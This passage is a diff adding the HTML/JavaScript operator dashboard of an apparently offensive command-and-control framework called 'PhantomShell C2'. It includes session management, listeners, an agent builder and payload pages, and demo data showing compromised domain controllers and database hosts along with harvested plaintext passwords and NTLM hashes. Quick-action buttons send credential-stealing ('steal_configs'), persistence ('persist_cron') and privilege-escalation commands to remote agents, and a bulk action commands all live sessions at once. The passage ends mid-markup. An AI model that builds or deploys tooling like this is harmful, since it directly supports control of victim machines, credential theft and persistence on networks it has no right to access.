@@ -1,0 +1,1502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PhantomShell C2 v5.2</title>
+<script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
+<link rel="icon" href="assets/logo.svg" type="image/svg+xml">
+<style>
+/* ═══════════════════════════════════════════════════════════════
+   CSS THEME
+   ═══════════════════════════════════════════════════════════════ */
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg-primary:#1a1a2e;--bg-secondary:#16213e;--bg-tertiary:#0f3460;
+  --accent:#e94560;--accent-purple:#533483;
+  --text:#eee;--text-dim:#999;--text-muted:#666;
+  --green:#00ff41;--red:#ff0040;--yellow:#ffd700;--blue:#4da6ff;
+  --border:#2a2a4a;--card-shadow:0 4px 16px rgba(0,0,0,0.3);
+  --radius:8px;--transition:0.2s ease;
+}
+html,body{height:100%;font-family:'Segoe UI','Inter',sans-serif;background:var(--bg-primary);color:var(--text);overflow:hidden}
+a{color:var(--accent);text-decoration:none}
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:var(--bg-primary)}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+
+/* Layout */
+.app{display:flex;height:100vh;width:100vw}
+.sidebar{width:220px;min-width:220px;background:var(--bg-secondary);border-right:1px solid var(--border);display:flex;flex-direction:column;transition:width var(--transition),min-width var(--transition)}
+.sidebar.collapsed{width:56px;min-width:56px}
+.sidebar.collapsed .nav-label,.sidebar.collapsed .sidebar-brand span,.sidebar.collapsed .sidebar-footer span{display:none}
+.sidebar.collapsed .sidebar-brand{justify-content:center;padding:16px 8px}
+.sidebar-brand{display:flex;align-items:center;gap:10px;padding:16px 18px;border-bottom:1px solid var(--border)}
+.sidebar-brand img{width:32px;height:32px}
+.sidebar-brand span{font-weight:700;font-size:14px;white-space:nowrap;color:var(--accent)}
+.sidebar-toggle{position:absolute;top:14px;right:-12px;width:24px;height:24px;background:var(--bg-tertiary);border:1px solid var(--border);border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;color:var(--text-dim);font-size:11px;z-index:10;transition:background var(--transition)}
+.sidebar-toggle:hover{background:var(--accent);color:#fff}
+.sidebar-nav{flex:1;padding:12px 0;overflow-y:auto}
+.nav-item{display:flex;align-items:center;gap:12px;padding:10px 18px;cursor:pointer;color:var(--text-dim);transition:all var(--transition);border-left:3px solid transparent;font-size:13px;white-space:nowrap}
+.nav-item:hover{background:rgba(233,69,96,0.08);color:var(--text)}
+.nav-item.active{color:var(--accent);background:rgba(233,69,96,0.12);border-left-color:var(--accent)}
+.nav-icon{width:18px;text-align:center;flex-shrink:0;font-size:15px}
+.sidebar-footer{padding:12px 18px;border-top:1px solid var(--border);font-size:11px;color:var(--text-muted);display:flex;align-items:center;gap:8px}
+.sidebar-footer .conn-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.conn-dot.connected{background:var(--green);box-shadow:0 0 6px var(--green)}
+.conn-dot.disconnected{background:var(--red);box-shadow:0 0 6px var(--red)}
+
+/* Main area */
+.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
+.topbar{height:48px;display:flex;align-items:center;justify-content:space-between;padding:0 24px;background:var(--bg-secondary);border-bottom:1px solid var(--border);flex-shrink:0}
+.topbar-title{font-size:15px;font-weight:600}
+.topbar-actions{display:flex;align-items:center;gap:16px}
+.topbar-actions button{background:none;border:none;color:var(--text-dim);cursor:pointer;font-size:15px;padding:4px;transition:color var(--transition)}
+.topbar-actions button:hover{color:var(--accent)}
+.kbd{background:var(--bg-tertiary);border:1px solid var(--border);border-radius:4px;padding:1px 6px;font-size:10px;color:var(--text-dim);font-family:monospace;margin-left:4px}
+.content{flex:1;overflow-y:auto;padding:24px}
+
+/* Cards & Stats */
+.stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;margin-bottom:24px}
+.stat-card{background:var(--bg-secondary);border:1px solid var(--border);border-radius:var(--radius);padding:20px;box-shadow:var(--card-shadow);transition:transform var(--transition),border-color var(--transition)}
+.stat-card:hover{transform:translateY(-2px);border-color:var(--accent)}
+.stat-card .label{font-size:12px;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.5px}
+.stat-card .value{font-size:28px;font-weight:700;margin:6px 0 0}
+.stat-card .value.green{color:var(--green)}.stat-card .value.red{color:var(--red)}.stat-card .value.yellow{color:var(--yellow)}.stat-card .value.blue{color:var(--blue)}.stat-card .value.accent{color:var(--accent)}
+
+/* Panels */
+.panel{background:var(--bg-secondary);border:1px solid var(--border);border-radius:var(--radius);box-shadow:var(--card-shadow);margin-bottom:20px;overflow:hidden}
+.panel-header{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;border-bottom:1px solid var(--border);font-size:13px;font-weight:600}
+.panel-body{padding:16px 18px}
+.panel-body.no-pad{padding:0}
+
+/* Tables */
+table{width:100%;border-collapse:collapse;font-size:13px}
+thead th{text-align:left;padding:10px 14px;background:var(--bg-primary);color:var(--text-dim);font-weight:600;text-transform:uppercase;font-size:11px;letter-spacing:0.5px;position:sticky;top:0;z-index:1}
+tbody tr{border-bottom:1px solid var(--border);cursor:pointer;transition:background var(--transition)}
+tbody tr:hover{background:rgba(233,69,96,0.06)}
+tbody tr.selected{background:rgba(233,69,96,0.12)}
+tbody td{padding:9px 14px;color:var(--text-dim)}
+.status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}
+.status-dot.alive{background:var(--green);box-shadow:0 0 6px var(--green)}
+.status-dot.dead{background:var(--red);box-shadow:0 0 4px var(--red)}
+
+/* Buttons */
+.btn{display:inline-flex;align-items:center;gap:6px;padding:7px 16px;border:none;border-radius:5px;cursor:pointer;font-size:12px;font-weight:600;transition:all var(--transition);font-family:inherit}
+.btn-primary{background:var(--accent);color:#fff}.btn-primary:hover{background:#c7374e}
+.btn-secondary{background:var(--bg-tertiary);color:var(--text);border:1px solid var(--border)}.btn-secondary:hover{border-color:var(--accent)}
+.btn-danger{background:var(--red);color:#fff}.btn-danger:hover{background:#cc0033}
+.btn-sm{padding:4px 10px;font-size:11px}
+.btn-group{display:flex;gap:8px;flex-wrap:wrap}
+
+/* Forms */
+.form-group{margin-bottom:16px}
+.form-group label{display:block;font-size:12px;color:var(--text-dim);margin-bottom:5px;font-weight:600}
+.form-control{width:100%;padding:8px 12px;background:var(--bg-primary);border:1px solid var(--border);border-radius:5px;color:var(--text);font-size:13px;font-family:inherit;transition:border-color var(--transition)}
+.form-control:focus{outline:none;border-color:var(--accent)}
+select.form-control{cursor:pointer}
+textarea.form-control{resize:vertical;font-family:'JetBrains Mono','Fira Code',monospace;font-size:12px}
+.form-row{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.checkbox-label{display:flex;align-items:center;gap:8px;cursor:pointer;font-size:13px;color:var(--text-dim)}
+.checkbox-label input{accent-color:var(--accent)}
+
+/* Terminal */
+.terminal{background:#0a0a14;border-radius:0 0 var(--radius) var(--radius);font-family:'JetBrains Mono','Fira Code',monospace;font-size:12.5px;line-height:1.6;position:relative}
+.terminal-output{padding:14px;max-height:360px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;color:var(--green)}
+.terminal-output .cmd{color:var(--text)}
+.terminal-output .prompt-text{color:var(--accent)}
+.terminal-output .error{color:var(--red)}
+.terminal-output .info{color:var(--blue)}
+.terminal-input-row{display:flex;align-items:center;padding:6px 14px 10px;border-top:1px solid #1a1a2e}
+.terminal-input-row .prompt-text{color:var(--accent);margin-right:8px;user-select:none}
+.terminal-input{flex:1;background:none;border:none;color:var(--text);font-family:inherit;font-size:12.5px;outline:none;caret-color:var(--accent)}
+
+/* Timeline */
+.timeline{list-style:none}
+.timeline li{position:relative;padding:8px 0 8px 24px;border-left:2px solid var(--border);font-size:12px;color:var(--text-dim)}
+.timeline li::before{content:'';position:absolute;left:-5px;top:12px;width:8px;height:8px;background:var(--accent);border-radius:50%}
+.timeline li .time{color:var(--text-muted);font-size:10px;margin-left:8px}
+
+/* Tabs */
+.tabs{display:flex;border-bottom:1px solid var(--border);padding:0 18px}
+.tab{padding:10px 16px;font-size:12px;font-weight:600;color:var(--text-dim);cursor:pointer;border-bottom:2px solid transparent;transition:all var(--transition)}
+.tab:hover{color:var(--text)}.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
+
+/* Network canvas */
+#network-canvas{width:100%;height:500px;background:var(--bg-primary);border-radius:var(--radius);cursor:grab;display:block}
+
+/* Badge */
+.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:700;text-transform:uppercase}
+.badge-green{background:rgba(0,255,65,0.15);color:var(--green)}
+.badge-red{background:rgba(255,0,64,0.15);color:var(--red)}
+.badge-yellow{background:rgba(255,215,0,0.15);color:var(--yellow)}
+.badge-blue{background:rgba(77,166,255,0.15);color:var(--blue)}
+.badge-purple{background:rgba(83,52,131,0.25);color:#a67ee6}
+
+/* Code block */
+.code-block{background:#0a0a14;border:1px solid var(--border);border-radius:var(--radius);padding:14px;font-family:'JetBrains Mono','Fira Code',monospace;font-size:12px;line-height:1.5;color:var(--green);position:relative;overflow-x:auto;white-space:pre-wrap;word-break:break-all;max-height:320px;overflow-y:auto}
+.code-block .copy-btn{position:absolute;top:8px;right:8px;background:var(--bg-tertiary);border:1px solid var(--border);color:var(--text-dim);padding:3px 10px;border-radius:4px;cursor:pointer;font-size:10px;transition:all var(--transition)}
+.code-block .copy-btn:hover{color:var(--accent);border-color:var(--accent)}
+
+/* Command palette overlay */
+.cmd-palette-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:1000;display:none;align-items:flex-start;justify-content:center;padding-top:15vh}
+.cmd-palette-overlay.open{display:flex}
+.cmd-palette{width:520px;background:var(--bg-secondary);border:1px solid var(--border);border-radius:var(--radius);box-shadow:0 20px 60px rgba(0,0,0,0.5);overflow:hidden}
+.cmd-palette input{width:100%;padding:14px 18px;background:transparent;border:none;border-bottom:1px solid var(--border);color:var(--text);font-size:14px;outline:none}
+.cmd-palette-results{max-height:300px;overflow-y:auto;padding:6px}
+.cmd-palette-item{padding:8px 14px;cursor:pointer;border-radius:5px;display:flex;align-items:center;gap:10px;font-size:13px;color:var(--text-dim)}
+.cmd-palette-item:hover,.cmd-palette-item.highlighted{background:rgba(233,69,96,0.12);color:var(--text)}
+.cmd-palette-item .shortcut{margin-left:auto;font-size:10px;color:var(--text-muted)}
+
+/* Search input */
+.search-input{background:var(--bg-primary);border:1px solid var(--border);border-radius:5px;padding:6px 12px;color:var(--text);font-size:12px;outline:none;transition:border-color var(--transition)}
+.search-input:focus{border-color:var(--accent)}
+
+/* Session detail info grid */
+.info-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px}
+.info-item{font-size:12px}.info-item .info-label{color:var(--text-muted);font-size:10px;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:2px}
+
+/* Quick actions */
+.quick-actions{display:flex;gap:8px;flex-wrap:wrap;padding:12px 18px;border-bottom:1px solid var(--border)}
+.quick-actions .btn{font-size:11px}
+
+/* Responsive */
+@media(max-width:1400px){.stats-row{grid-template-columns:repeat(auto-fit,minmax(150px,1fr))}}
+@media(max-width:900px){.sidebar{position:fixed;left:0;top:0;bottom:0;z-index:100;transform:translateX(-100%)}.sidebar.mobile-open{transform:translateX(0)}.form-row{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="app">
+  <!-- Sidebar -->
+  <aside class="sidebar" id="sidebar">
+    <div class="sidebar-brand" style="position:relative">
+      <img src="assets/logo.svg" alt="PhantomShell">
+      <span>PhantomShell C2</span>
+      <div class="sidebar-toggle" id="sidebar-toggle" title="Toggle sidebar">&#9666;</div>
+    </div>
+    <nav class="sidebar-nav">
+      <div class="nav-item active" data-page="dashboard"><span class="nav-icon">&#9632;</span><span class="nav-label">Dashboard</span></div>
+      <div class="nav-item" data-page="sessions"><span class="nav-icon">&#9881;</span><span class="nav-label">Sessions</span></div>
+      <div class="nav-item" data-page="listeners"><span class="nav-icon">&#9898;</span><span class="nav-label">Listeners</span></div>
+      <div class="nav-item" data-page="builder"><span class="nav-icon">&#9874;</span><span class="nav-label">Builder</span></div>
+      <div class="nav-item" data-page="creds"><span class="nav-icon">&#9919;</span><span class="nav-label">Credentials</span></div>
+      <div class="nav-item" data-page="network"><span class="nav-icon">&#9700;</span><span class="nav-label">Network Map</span></div>
+      <div class="nav-item" data-page="reports"><span class="nav-icon">&#9776;</span><span class="nav-label">Reports</span></div>
+      <div class="nav-item" data-page="payloads"><span class="nav-icon">&#9883;</span><span class="nav-label">Payloads</span></div>
+      <div class="nav-item" data-page="logs"><span class="nav-icon">&#9783;</span><span class="nav-label">Logs</span></div>
+    </nav>
+    <div class="sidebar-footer">
+      <span class="conn-dot disconnected" id="conn-status"></span>
+      <span id="conn-label">Disconnected</span>
+    </div>
+  </aside>
+
+  <!-- Main content -->
+  <div class="main">
+    <div class="topbar">
+      <div class="topbar-title" id="page-title">Dashboard</div>
+      <div class="topbar-actions">
+        <button onclick="toggleCmdPalette()" title="Command Palette (Ctrl+K)">&#8984; <span class="kbd">Ctrl+K</span></button>
+        <button onclick="location.reload()" title="Refresh">&#8635;</button>
+        <button title="Operator">&#9673; operator</button>
+      </div>
+    </div>
+    <div class="content" id="content"></div>
+  </div>
+</div>
+
+<!-- Command Palette -->
+<div class="cmd-palette-overlay" id="cmd-palette">
+  <div class="cmd-palette">
+    <input type="text" id="cmd-palette-input" placeholder="Search commands, sessions, actions..." autocomplete="off">
+    <div class="cmd-palette-results" id="cmd-palette-results"></div>
+  </div>
+</div>
+
+<script>
+/* ═══════════════════════════════════════════════════════════════
+   STATE & CONFIG
+   ═══════════════════════════════════════════════════════════════ */
+const API_BASE = window.location.origin;
+const WS_URL = API_BASE;
+
+const state = {
+  sessions: [],
+  listeners: [],
+  credentials: [],
+  logs: [],
+  timeline: [],
+  networkNodes: [],
+  networkEdges: [],
+  selectedSession: null,
+  currentPage: localStorage.getItem('ps_page') || 'dashboard',
+  cmdHistory: JSON.parse(localStorage.getItem('ps_cmd_history') || '[]'),
+  cmdHistoryIdx: -1
+};
+
+/* Demo data for offline/standalone rendering */
+function seedDemoData() {
+  state.sessions = [
+    {id:'sess-1a3f',agent_id:'ag-001',hostname:'web01',ip:'10.10.14.22',username:'www-data',os:'Linux 5.15',agent_type:'python',integrity:'medium',alive:true,last_beacon:Date.now()-12000,transport:'HTTP',encryption:'AES-256-GCM',pid:1842,pending_tasks:2},
+    {id:'sess-2b7c',agent_id:'ag-002',hostname:'DC01',ip:'10.10.10.5',username:'CORP\\admin',os:'Windows Server 2022',agent_type:'csharp',integrity:'high',alive:true,last_beacon:Date.now()-5000,transport:'TCP',encryption:'ChaCha20',pid:4120,pending_tasks:0},
+    {id:'sess-3d9a',agent_id:'ag-003',hostname:'db-master',ip:'10.10.14.30',username:'postgres',os:'Linux 6.1',agent_type:'python',integrity:'medium',alive:true,last_beacon:Date.now()-45000,transport:'HTTP',encryption:'AES-256-GCM',pid:2901,pending_tasks:1},
+    {id:'sess-4e2b',agent_id:'ag-004',hostname:'files01',ip:'10.10.10.12',username:'svc_backup',os:'Windows 10',agent_type:'powershell',integrity:'high',alive:false,last_beacon:Date.now()-3600000,transport:'HTTP',encryption:'AES-256-GCM',pid:0,pending_tasks:0},
+    {id:'sess-5f1c',agent_id:'ag-005',hostname:'kali-pivot',ip:'10.10.14.1',username:'root',os:'Linux 6.5',agent_type:'go',integrity:'high',alive:true,last_beacon:Date.now()-2000,transport:'TCP',encryption:'ChaCha20',pid:993,pending_tasks:5},
+    {id:'sess-6a8d',agent_id:'ag-006',hostname:'mail01',ip:'10.10.10.25',username:'exchange',os:'Windows Server 2019',agent_type:'csharp',integrity:'medium',alive:true,last_beacon:Date.now()-90000,transport:'HTTP',encryption:'AES-256-GCM',pid:6744,pending_tasks:0},
+    {id:'sess-7b0e',agent_id:'ag-007',hostname:'dev-ws',ip:'10.10.14.55',username:'jdoe',os:'Linux 6.2',agent_type:'php',integrity:'low',alive:false,last_beacon:Date.now()-7200000,transport:'HTTP',encryption:'none',pid:0,pending_tasks:0}
+  ];
+  state.listeners = [
+    {id:'lst-01',type:'HTTP',host:'0.0.0.0',port:8443,status:'running',started:Date.now()-86400000},
+    {id:'lst-02',type:'TCP',host:'0.0.0.0',port:4444,status:'running',started:Date.now()-43200000},
+    {id:'lst-03',type:'HTTPS',host:'0.0.0.0',port:443,status:'stopped',started:null}
+  ];
+  state.credentials = [
+    {source:'steal_creds',type:'plaintext',username:'admin',password:'P@ssw0rd!',host:'DC01',database:''},
+    {source:'steal_configs',type:'hash',username:'sa',password:'e10adc3949ba59abbe56e057f20f883e',host:'db-master',database:'mssql'},
+    {source:'mimikatz',type:'NTLM',username:'CORP\\svc_sql',password:'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117...',host:'DC01',database:''},
+    {source:'steal_configs',type:'API key',username:'aws_key',password:'AKIA...REDACTED',host:'web01',database:''},
+    {source:'steal_creds',type:'plaintext',username:'postgres',password:'dbpass123',host:'db-master',database:'appdb'}
+  ];
+  state.timeline = [
+    {time:Date.now()-5000,event:'Agent ag-005 beacon received',type:'info'},
+    {time:Date.now()-12000,event:'Task completed on sess-1a3f: sysinfo',type:'success'},
+    {time:Date.now()-30000,event:'New credential harvested: admin@DC01',type:'cred'},
+    {time:Date.now()-120000,event:'Agent ag-002 connected via TCP',type:'connect'},
+    {time:Date.now()-300000,event:'Listener HTTP:8443 started',type:'info'},
+    {time:Date.now()-600000,event:'Agent ag-004 disconnected (timeout)',type:'disconnect'},
+    {time:Date.now()-900000,event:'Privesc check completed on web01',type:'success'},
+    {time:Date.now()-1800000,event:'Payload generated: python/http/aes256',type:'info'}
+  ];
+  state.networkNodes = [
+    {id:'n1',label:'kali-pivot',ip:'10.10.14.1',x:100,y:250,status:'compromised',subnet:'14'},
+    {id:'n2',label:'web01',ip:'10.10.14.22',x:300,y:150,status:'compromised',subnet:'14'},
+    {id:'n3',label:'db-master',ip:'10.10.14.30',x:300,y:350,status:'compromised',subnet:'14'},
+    {id:'n4',label:'dev-ws',ip:'10.10.14.55',x:500,y:250,status:'compromised',subnet:'14'},
+    {id:'n5',label:'DC01',ip:'10.10.10.5',x:700,y:150,status:'compromised',subnet:'10'},
+    {id:'n6',label:'files01',ip:'10.10.10.12',x:700,y:350,status:'compromised',subnet:'10'},
+    {id:'n7',label:'mail01',ip:'10.10.10.25',x:900,y:250,status:'compromised',subnet:'10'},
+    {id:'n8',label:'fw-01',ip:'10.10.10.1',x:500,y:50,status:'scanned',subnet:'10'},
+    {id:'n9',label:'printer',ip:'10.10.10.99',x:900,y:400,status:'discovered',subnet:'10'}
+  ];
+  state.networkEdges = [
+    {from:'n1',to:'n2'},{from:'n1',to:'n3'},{from:'n2',to:'n4'},{from:'n2',to:'n5'},
+    {from:'n5',to:'n6'},{from:'n5',to:'n7'},{from:'n5',to:'n8'}
+  ];
+}
+seedDemoData();
+
+/* ═══════════════════════════════════════════════════════════════
+   SOCKET.IO REAL-TIME CONNECTION
+   ═══════════════════════════════════════════════════════════════ */
+let socket = null;
+function initSocket() {
+  try {
+    socket = io(WS_URL, {reconnection: true, reconnectionDelay: 3000, transports: ['websocket','polling']});
+    socket.on('connect', () => {
+      document.getElementById('conn-status').className = 'conn-dot connected';
+      document.getElementById('conn-label').textContent = 'Connected';
+    });
+    socket.on('disconnect', () => {
+      document.getElementById('conn-status').className = 'conn-dot disconnected';
+      document.getElementById('conn-label').textContent = 'Disconnected';
+    });
+    /* Real-time event handlers for C2 updates */
+    socket.on('agent_connected', (data) => {
+      const existing = state.sessions.find(s => s.id === data.id);
+      if (existing) { Object.assign(existing, data, {alive: true}); }
+      else { state.sessions.push({...data, alive: true}); }
+      addTimelineEvent('Agent ' + data.agent_id + ' connected', 'connect');
+      if (state.currentPage === 'dashboard' || state.currentPage === 'sessions') renderPage();
+    });
+    socket.on('agent_disconnected', (data) => {
+      const s = state.sessions.find(s => s.id === data.id);
+      if (s) { s.alive = false; s.last_beacon = Date.now(); }
+      addTimelineEvent('Agent ' + (data.agent_id || data.id) + ' disconnected', 'disconnect');
+      if (state.currentPage === 'dashboard' || state.currentPage === 'sessions') renderPage();
+    });
+    socket.on('beacon_update', (data) => {
+      const s = state.sessions.find(s => s.id === data.id);
+      if (s) { s.last_beacon = Date.now(); s.alive = true; if (data.pending_tasks !== undefined) s.pending_tasks = data.pending_tasks; }
+    });
+    socket.on('task_response', (data) => {
+      addTimelineEvent('Task result on ' + data.session_id + ': ' + (data.command || ''), 'success');
+      if (state.selectedSession && state.selectedSession.id === data.session_id) {
+        appendTerminalOutput(data.output || data.result || '(no output)', 'output');
+      }
+    });
+    socket.on('new_credential', (data) => {
+      state.credentials.push(data);
+      addTimelineEvent('Credential harvested: ' + data.username + '@' + data.host, 'cred');
+      if (state.currentPage === 'creds') renderPage();
+    });
+  } catch (e) {
+    console.warn('Socket.IO not available, running in standalone mode');
+  }
+}
+
+function addTimelineEvent(event, type) {
+  state.timeline.unshift({time: Date.now(), event, type});
+  if (state.timeline.length > 50) state.timeline.pop();
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   ROUTER
+   ═══════════════════════════════════════════════════════════════ */
+function navigate(page) {
+  state.currentPage = page;
+  state.selectedSession = null;
+  localStorage.setItem('ps_page', page);
+  window.location.hash = page;
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.page === page));
+  document.getElementById('page-title').textContent = pageTitle(page);
+  renderPage();
+}
+
+function pageTitle(p) {
+  const titles = {dashboard:'Dashboard',sessions:'Sessions',listeners:'Listeners',builder:'Agent Builder',creds:'Credentials',network:'Network Map',reports:'Reports',payloads:'Payloads',logs:'Activity Logs'};
+  return titles[p] || p;
+}
+
+window.addEventListener('hashchange', () => {
+  const h = window.location.hash.slice(1);
+  if (h && h !== state.currentPage) navigate(h);
+});
+
+/* ═══════════════════════════════════════════════════════════════
+   RENDER ENGINE
+   ═══════════════════════════════════════════════════════════════ */
+function renderPage() {
+  const c = document.getElementById('content');
+  switch (state.currentPage) {
+    case 'dashboard': c.innerHTML = renderDashboard(); break;
+    case 'sessions': c.innerHTML = state.selectedSession ? renderSessionDetail() : renderSessions(); break;
+    case 'listeners': c.innerHTML = renderListeners(); break;
+    case 'builder': c.innerHTML = renderBuilder(); break;
+    case 'creds': c.innerHTML = renderCreds(); break;
+    case 'network': c.innerHTML = renderNetwork(); setTimeout(initNetworkCanvas, 50); break;
+    case 'reports': c.innerHTML = renderReports(); break;
+    case 'payloads': c.innerHTML = renderPayloads(); break;
+    case 'logs': c.innerHTML = renderLogs(); break;
+    default: c.innerHTML = renderDashboard();
+  }
+}
+
+function timeAgo(ts) {
+  const d = Math.floor((Date.now() - ts) / 1000);
+  if (d < 5) return 'just now';
+  if (d < 60) return d + 's ago';
+  if (d < 3600) return Math.floor(d/60) + 'm ago';
+  if (d < 86400) return Math.floor(d/3600) + 'h ago';
+  return Math.floor(d/86400) + 'd ago';
+}
+
+/* ── Dashboard ────────────────────────────────────────────────── */
+function renderDashboard() {
+  const alive = state.sessions.filter(s => s.alive).length;
+  const dead = state.sessions.filter(s => !s.alive).length;
+  const lRunning = state.listeners.filter(l => l.status === 'running').length;
+  const tasks = state.sessions.reduce((a,s) => a + (s.pending_tasks||0), 0);
+  const tl = state.timeline.slice(0, 20).map(e =>
+    `<li><strong>${e.event}</strong><span class="time">${timeAgo(e.time)}</span></li>`
+  ).join('');
+  return `
+    <div class="stats-row">
+      <div class="stat-card"><div class="label">Active Sessions</div><div class="value green">${alive}</div></div>
+      <div class="stat-card"><div class="label">Dead Sessions</div><div class="value red">${dead}</div></div>
+      <div class="stat-card"><div class="label">Listeners</div><div class="value blue">${lRunning}</div></div>
+      <div class="stat-card"><div class="label">Queued Tasks</div><div class="value yellow">${tasks}</div></div>
+      <div class="stat-card"><div class="label">Credentials</div><div class="value accent">${state.credentials.length}</div></div>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
+      <div class="panel">
+        <div class="panel-header">Recent Sessions</div>
+        <div class="panel-body no-pad">
+          <table><thead><tr><th>Host</th><th>User</th><th>Status</th><th>Last Beacon</th></tr></thead><tbody>
+          ${state.sessions.slice(0,5).map(s => `<tr onclick="selectSession('${s.id}')">
+            <td style="color:var(--text)">${s.hostname}</td><td>${s.username}</td>
+            <td><span class="status-dot ${s.alive?'alive':'dead'}"></span>${s.alive?'alive':'dead'}</td>
+            <td>${timeAgo(s.last_beacon)}</td></tr>`).join('')}
+          </tbody></table>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="panel-header">Activity Timeline</div>
+        <div class="panel-body" style="max-height:320px;overflow-y:auto">
+          <ul class="timeline">${tl || '<li>No recent activity</li>'}</ul>
+        </div>
+      </div>
+    </div>`;
+}
+
+/* ── Sessions ─────────────────────────────────────────────────── */
+function renderSessions() {
+  const rows = state.sessions.map(s => `
+    <tr onclick="selectSession('${s.id}')" class="${state.selectedSession && state.selectedSession.id===s.id?'selected':''}">
+      <td style="color:var(--text);font-family:monospace;font-size:11px">${s.id}</td>
+      <td style="color:var(--text)">${s.hostname}</td>
+      <td>${s.ip}</td><td>${s.username}</td><td>${s.os}</td>
+      <td><span class="badge badge-${s.agent_type==='python'?'green':s.agent_type==='csharp'?'blue':s.agent_type==='powershell'?'purple':s.agent_type==='go'?'yellow':'red'}">${s.agent_type}</span></td>
+      <td><span class="badge badge-${s.integrity==='high'?'red':s.integrity==='medium'?'yellow':'blue'}">${s.integrity}</span></td>
+      <td><span class="status-dot ${s.alive?'alive':'dead'}"></span>${s.alive?'alive':'dead'}</td>
+      <td>${timeAgo(s.last_beacon)}</td>
+      <td>${s.pending_tasks||0}</td>
+    </tr>`).join('');
+  return `
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
+      <input type="text" class="search-input" placeholder="Filter sessions..." oninput="filterSessions(this.value)" style="width:260px">
+      <div class="btn-group">
+        <button class="btn btn-secondary btn-sm" onclick="bulkAction('sleep')">&#9210; Sleep All</button>
+        <button class="btn btn-danger btn-sm" onclick="bulkAction('kill')">&#10006; Kill All</button>
+      </div>
+    </div>
+    <div class="panel">
+      <div class="panel-body no-pad">
+        <div style="overflow-x:auto">
+        <table id="session-table"><thead><tr>
+          <th>ID</th><th>Host</th><th>IP</th><th>User</th><th>OS</th><th>Type</th><th>Integrity</th><th>Status</th><th>Last Beacon</th><th>Tasks</th>
+        </tr></thead><tbody>${rows}</tbody></table>
+        </div>
+      </div>
+    </div>`;
+}
+
+function selectSession(id) {
+  state.selectedSession = state.sessions.find(s => s.id === id) || null;
+  state.currentPage = 'sessions';
+  document.getElementById('page-title').textContent = state.selectedSession ? 'Session: ' + state.selectedSession.hostname : 'Sessions';
+  renderPage();
+  const ti = document.getElementById('term-input');
+  if (ti) ti.focus();
+}
+
+function backToSessions() {
+  state.selectedSession = null;
+  document.getElementById('page-title').textContent = 'Sessions';
+  renderPage();
+}
+
+function filterSessions(q) {
+  q = q.toLowerCase();
+  document.querySelectorAll('#session-table tbody tr').forEach(r => {
+    r.style.display = r.textContent.toLowerCase().includes(q) ? '' : 'none';
+  });
+}
+
+function bulkAction(action) {
+  if (!confirm('Run ' + action + ' on all alive sessions?')) return;
+  state.sessions.filter(s => s.alive).forEach(s => {
+    sendCommand(s.id, action === 'kill' ? 'exit' : 'sleep 60');
+  });
+  addTimelineEvent('Bulk ' + action + ' executed on all sessions', 'info');
+}
+
+/* ── Session Detail ───────────────────────────────────────────── */
+function renderSessionDetail() {
+  const s = state.selectedSession;
+  if (!s) return renderSessions();
+  return `
+    <div style="margin-bottom:16px">
+      <button class="btn btn-secondary btn-sm" onclick="backToSessions()">&#8592; Back to Sessions</button>
+    </div>
+    <div class="panel">
+      <div class="panel-header">Session Information &mdash; ${s.id}</div>
+      <div class="panel-body">
+        <div class="info-grid">
+          <div class="info-item"><div class="info-label">Hostname</div><div>${s.hostname}</div></div>
+          <div class="info-item"><div class="info-label">IP Address</div><div>${s.ip}</div></div>
+          <div class="info-item"><div class="info-label">Username</div><div>${s.username}</div></div>
+          <div class="info-item"><div class="info-label">OS</div><div>${s.os}</div></div>
+          <div class="info-item"><div class="info-label">PID</div><div>${s.pid}</div></div>
+          <div class="info-item"><div class="info-label">Integrity</div><div><span class="badge badge-${s.integrity==='high'?'red':'yellow'}">${s.integrity}</span></div></div>
+          <div class="info-item"><div class="info-label">Transport</div><div>${s.transport}</div></div>
+          <div class="info-item"><div class="info-label">Encryption</div><div>${s.encryption}</div></div>
+          <div class="info-item"><div class="info-label">Agent Type</div><div>${s.agent_type}</div></div>
+          <div class="info-item"><div class="info-label">Status</div><div><span class="status-dot ${s.alive?'alive':'dead'}"></span>${s.alive?'Alive':'Dead'}</div></div>
+        </div>
+      </div>
+    </div>
+    <div class="quick-actions">
+      <button class="btn btn-primary btn-sm" onclick="quickCmd('sysinfo')">sysinfo</button>
+      <button class="btn btn-primary btn-sm" onclick="quickCmd('privesc_check')">privesc_check</button>
+      <button class="btn btn-primary btn-sm" onclick="quickCmd('steal_configs')">steal_configs</button>
+      <button class="btn btn-primary btn-sm" onclick="quickCmd('persist_cron')">persist_cron</button>
+      <button class="btn btn-secondary btn-sm" onclick="quickCmd('ls -la')">ls -la</button>
+      <button class="btn btn-secondary btn-sm" onclick="quickCmd('whoami')">whoami</button>
+      <button class="btn btn-secondary btn-sm" onclick="quickCmd('id')">id</button>
+      <button class="btn btn-danger btn-sm" onclick="quickCmd('exit')">kill session</button>
+    </div>
+    <div class="tabs" id="session-tabs">
